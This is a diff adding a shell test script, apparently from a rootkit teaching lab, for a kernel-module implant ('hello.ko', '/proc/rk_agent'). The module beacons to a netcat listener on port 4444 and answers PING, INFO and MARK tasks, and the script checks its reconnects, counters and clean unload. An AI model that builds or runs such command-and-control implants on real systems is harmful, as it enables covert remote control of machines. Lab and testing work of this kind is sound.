@@ -1,0 +1,129 @@
+#!/bin/sh
+. /lib/check.sh
+
+begin "7-implant"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+
+if insmod /rootkitlings/hello.ko target=not-an-ip port=4444 interval=1 \
+    2>/dev/null; then
+    _fail "invalid IPv4 target was accepted"
+    rmmod hello 2>/dev/null || true
+else
+    _ok "invalid IPv4 target rejected"
+fi
+assert_absent /proc/rk_agent
+
+label="mark_$$_$(date +%s)"
+output_one=/tmp/agent-one
+(
+    printf 'PING\nINFO\nMARK %s\nQUIT\n' "$label"
+    sleep 1
+) | nc -l -p 4444 >"$output_one" 2>/dev/null &
+listener_one=$!
+sleep 1
+
+load hello.ko target=127.0.0.1 port=4444 interval=1
+assert_loaded hello
+assert_exists /proc/rk_agent
+
+attempt=0
+while [ "$attempt" -lt 30 ] && ! grep -q '^MARKED ' "$output_one"; do
+    sleep 0.1
+    attempt=$((attempt + 1))
+done
+kill "$listener_one" 2>/dev/null || true
+wait "$listener_one" 2>/dev/null || true
+
+if grep -qx 'PONG' "$output_one"; then
+    _ok "PING returned PONG"
+else
+    _fail "PING reply missing"
+fi
+if grep -q '^kernel=' "$output_one"; then
+    _ok "INFO returned the running kernel"
+else
+    _fail "INFO reply missing"
+fi
+if grep -qx "MARKED /tmp/rk_mark_$label" "$output_one"; then
+    _ok "MARK returned the exact artifact path"
+else
+    _fail "MARK reply missing or incorrect"
+fi
+if [ -f "/tmp/rk_mark_$label" ]; then
+    _ok "MARK created the requested artifact"
+else
+    _fail "MARK did not create the requested artifact"
+fi
+
+output_two=/tmp/agent-two
+(
+    printf 'UNKNOWN-%s\nPING\nQUIT\n' "$$"
+    sleep 1
+) | nc -l -p 4444 >"$output_two" 2>/dev/null &
+listener_two=$!
+
+attempt=0
+while [ "$attempt" -lt 40 ] && ! grep -q '^PONG$' "$output_two"; do
+    sleep 0.1
+    attempt=$((attempt + 1))
+done
+kill "$listener_two" 2>/dev/null || true
+wait "$listener_two" 2>/dev/null || true
+
+if grep -qx 'ERR unknown task' "$output_two"; then
+    _ok "unknown task rejected explicitly"
+else
+    _fail "unknown-task reply missing"
+fi
+if grep -qx 'PONG' "$output_two"; then
+    _ok "agent served a second connection"
+else
+    _fail "agent did not reconnect"
+fi
+
+connections=$(sed -n 's/^connections=//p' /proc/rk_agent)
+requests=$(sed -n 's/^requests=//p' /proc/rk_agent)
+if [ "${connections:-0}" -ge 2 ] 2>/dev/null; then
+    _ok "connection counter reached $connections"
+else
+    _fail "expected at least two connections, got ${connections:-missing}"
+fi
+if [ "${requests:-0}" -ge 5 ] 2>/dev/null; then
+    _ok "request counter reached $requests"
+else
+    _fail "expected at least five requests, got ${requests:-missing}"
+fi
+
+(
+    printf 'PING\n'
+    sleep 20
+) | nc -l -p 4444 >/tmp/agent-three 2>/dev/null &
+listener_three=$!
+
+attempt=0
+while [ "$attempt" -lt 40 ]; do
+    connections=$(sed -n 's/^connections=//p' /proc/rk_agent)
+    [ "${connections:-0}" -ge 3 ] 2>/dev/null && break
+    sleep 0.1
+    attempt=$((attempt + 1))
+done
+
+started=$(date +%s)
+unload hello
+elapsed=$(($(date +%s) - started))
+if [ "$elapsed" -le 2 ]; then
+    _ok "unload interrupted a blocked session"
+else
+    _fail "unload took ${elapsed}s"
+fi
+assert_absent /proc/rk_agent
+if ps | grep -q '[r]k_agent'; then
+    _fail "rk_agent thread remained after unload"
+else
+    _ok "rk_agent thread removed"
+fi
+
+kill "$listener_three" 2>/dev/null || true
+rm -f "/tmp/rk_mark_$label" "$output_one" "$output_two" /tmp/agent-three
+summary
